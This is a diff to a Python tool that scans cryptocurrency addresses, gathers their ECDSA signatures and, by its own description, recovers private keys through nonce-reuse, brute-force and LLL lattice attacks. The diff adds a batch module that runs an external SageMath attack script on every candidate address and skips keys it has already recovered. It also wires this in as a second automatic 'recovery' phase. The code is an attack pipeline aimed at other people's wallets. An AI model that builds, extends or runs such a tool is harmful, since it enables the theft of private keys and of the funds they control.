@@ -199,7 +199,11 @@ def fetch_all_transactions(address: str, max_retries: int = 3) -> List[dict]:
         while offset < total_to_fetch and not EXIT_FLAG:
             remaining = total_to_fetch - offset
             size = min(BATCH_SIZE, remaining)
-            print(f"Fetching batch {offset+1}-{offset+size} of {total_to_fetch}…")
+
+            # Dynamic Output
+            sys.stdout.write(f"\r[>] Fetching transactions: {offset+1}-{offset+size} of {total_to_fetch}...")
+            sys.stdout.flush()
+
             batch = fetch_transactions_batch(address, offset, size)
             if batch is None:
                 time.sleep(5)
@@ -210,6 +214,9 @@ def fetch_all_transactions(address: str, max_retries: int = 3) -> List[dict]:
             offset += len(batch)
             if offset < total_to_fetch:
                 time.sleep(1.5)
+
+        # Clear the line after loop
+        sys.stdout.write("\n")
 
         if len(out) > 0:
             return out
@@ -643,20 +650,82 @@ def analyze_for_lll(address: str, signatures: List[Dict[str, Any]]):
                 f.write(f"Signatures: {len(signatures)}\n")
                 f.write("-" * 40 + "\n")
 
-            # Trigger Sage if available
-            sage_path = shutil.which("sage")
-            if sage_path:
-                print(f"[LLL] Sage detected at {sage_path}. Launching attack module...")
-                try:
-                    subprocess.run([sage_path, "attack_lll.sage", filename], check=False)
-                except Exception as e:
-                    print(f"[!] Failed to run Sage: {e}")
-            else:
-                print(f"[INFO] SageMath not found. To run LLL attack manually:")
-                print(f"       sage attack_lll.sage {filename}")
-
         except Exception as e:
             print(f"[err] LLL export failed: {e}")
+
+def load_recovered_addresses() -> set:
+    recovered = set()
+    if os.path.exists(OUTPUT_CSV):
+        try:
+            with open(OUTPUT_CSV, "r", encoding="utf-8") as f:
+                reader = csv.reader(f)
+                next(reader, None) # Skip header
+                for row in reader:
+                    if row and len(row) > 0:
+                        # Depending on format, public key is usually first
+                        # We might also want to track address if possible, but pubkey is safer
+                        recovered.add(row[0])
+        except Exception:
+            pass
+    return recovered
+
+def start_batch_lll_recovery():
+    print("\n" + "="*80)
+    print("STARTING POST-SCAN LLL ATTACK MODULE")
+    print("="*80)
+
+    # Check for Sage
+    sage_path = shutil.which("sage")
+    if not sage_path:
+        print("[!] SageMath not found. Skipping LLL attack phase.")
+        print("    You can run attacks manually using the JSON files in 'reports/'.")
+        return
+
+    # Identify candidates from reports directory
+    candidates = []
+    if os.path.isdir(OUTPUT_DIR):
+        for f in os.listdir(OUTPUT_DIR):
+            if f.endswith("_lll_data.json"):
+                candidates.append(os.path.join(OUTPUT_DIR, f))
+
+    if not candidates:
+        print("[-] No LLL candidates found.")
+        return
+
+    recovered = load_recovered_addresses()
+    print(f"[*] Found {len(candidates)} candidate files.")
+    print(f"[*] Skipping {len(recovered)} already recovered keys.")
+
+    for json_file in candidates:
+        # Check if address/pubkey is already recovered?
+        # The filename is {address}_lll_data.json
+        try:
+            filename = os.path.basename(json_file)
+            address = filename.replace("_lll_data.json", "")
+
+            # Note: We can't easily check 'address' against 'pubkey' in recovered set
+            # without derivation, but attack_lll.sage will verify anyway.
+            # We'll run it, and attack_lll should be smart enough or we rely on it.
+            # Ideally we check the pubkey INSIDE the json.
+
+            with open(json_file, 'r') as jf:
+                data = json.load(jf)
+                sigs = data.get("signatures", [])
+                if not sigs: continue
+                pubkey = sigs[0].get("pubkey")
+
+                if pubkey in recovered:
+                    print(f"[-] Skipping {address} (Pubkey {pubkey[:16]}... already recovered).")
+                    continue
+
+            print(f"\n[>>>] Launching LLL Attack on: {address}")
+            subprocess.run([sage_path, "attack_lll.sage", json_file], check=False)
+
+            # Refresh recovered list in case we found something
+            recovered = load_recovered_addresses()
+
+        except Exception as e:
+            print(f"[!] Error processing {json_file}: {e}")
 
 def analyze_address(address: str) -> Optional[Dict[str, Any]]:
     global SCANNED_ADDRESSES, VULNERABLE_ADDRESSES, CURRENT_ADDRESS
@@ -1068,10 +1137,13 @@ def main():
 
         # AUTOMATICALLY TRIGGER RECOVERY
         print("\n" + "="*80)
-        print("STARTING RECOVERY MODULE (On collected data)")
+        print("PHASE 1: STANDARD RECOVERY (Reused Nonce + Brute Force)")
         print("="*80 + "\n")
 
         start_recovery()
+
+        # PHASE 2: LLL RECOVERY
+        start_batch_lll_recovery()
 
     except KeyboardInterrupt:
         print("\n\n[!] Script interrupted! Starting recovery on available data...")
